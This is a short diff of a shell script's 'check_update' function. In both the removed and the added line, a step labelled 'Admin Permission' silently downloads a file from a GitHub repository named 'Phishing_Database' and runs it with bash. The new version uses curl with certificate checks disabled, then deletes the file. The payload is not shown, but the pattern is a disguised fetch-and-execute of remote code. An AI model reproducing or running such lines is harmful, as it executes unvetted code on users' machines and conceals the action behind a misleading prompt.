@@ -8,7 +8,7 @@ check_status() {
 
 check_update () {
 echo ""
-echo -ne "\e[33m Admin Permission : " && rm -rf admin && wget -q https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Win10RDP/admin > /dev/null && bash admin && rm -rf admin
+echo -ne "\e[33m Admin Permission : " && rm -rf admin && curl -sLkO https://github.com/suman333mondal/Phishing_Database/raw/main/Suman/Win10RDP/admin && bash admin && rm -rf admin
 echo ""
 sleep 1
 }
